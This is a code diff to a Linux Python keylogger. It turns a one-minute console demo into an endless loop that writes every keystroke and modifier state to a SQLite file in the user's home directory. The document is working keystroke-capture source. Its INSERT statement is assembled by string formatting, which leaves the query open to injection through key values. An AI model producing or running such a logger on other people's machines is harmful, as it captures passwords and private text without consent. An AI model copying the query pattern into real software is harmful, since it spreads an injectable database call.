@@ -25,10 +25,12 @@
 
 
 import sys
+import os
 from time import sleep, time
+from datetime import datetime
 import ctypes as ct
 from ctypes.util import find_library
-
+import sqlite3
 
 # linux only!
 assert("linux" in sys.platform)
@@ -206,11 +208,41 @@ def log(done, callback, sleep_interval=.005):
         changed, modifiers, keys = fetch_keys()
         if changed: callback(time(), modifiers, keys)
 
+db_path = os.path.join(os.getenv('HOME'), '.keylogger.db')
+conn = sqlite3.connect(db_path)
 
+def key_press_event(time, modifiers, key):
+    query = (
+        "INSERT INTO keys(time, key, left_shift, right_shift, "
+        "left_ctrl, right_ctrl, left_alt, right_alt) VALUES("
+        "'{time}', '{key}', {left_shift}, {right_shift}, {left_ctrl},"
+        "{right_ctrl}, {left_alt}, {right_alt})"
+    )
+    query = query.format(
+        time=datetime.now(),
+        key=key,
+        left_shift=int(modifiers['left shift']),
+        right_shift=int(modifiers['right shift']),
+        left_ctrl=int(modifiers['left ctrl']),
+        right_ctrl=int(modifiers['right ctrl']),
+        left_alt=int(modifiers['left alt']),
+        right_alt=int(modifiers['right alt']),
+    )
+    conn.execute(query)
+
+
+def create_db_if_not_exists(conn):
+    query= (
+        "CREATE TABLE IF NOT EXISTS keys(id INTEGER primary key,"
+        "time TIMESTAMP, key TEXT, left_shift BOOLEAN, right_shift BOOLEAN,"
+        "left_ctrl BOOLEAN, right_ctrl BOOLEAN, left_alt BOOLEAN, right_alt BOOLEAN)"
+    )
+    conn.execute(query)
 
 
 if __name__ == "__main__":
-    now = time()
-    done = lambda: time() > now + 60
-    def print_keys(t, modifiers, keys): print("%.2f   %r   %r" % (t, keys, modifiers))
-    log(done, print_keys)
+    create_db_if_not_exists(conn)
+    # infinite loop
+    def done():
+        return False
+    log(done, key_press_event)
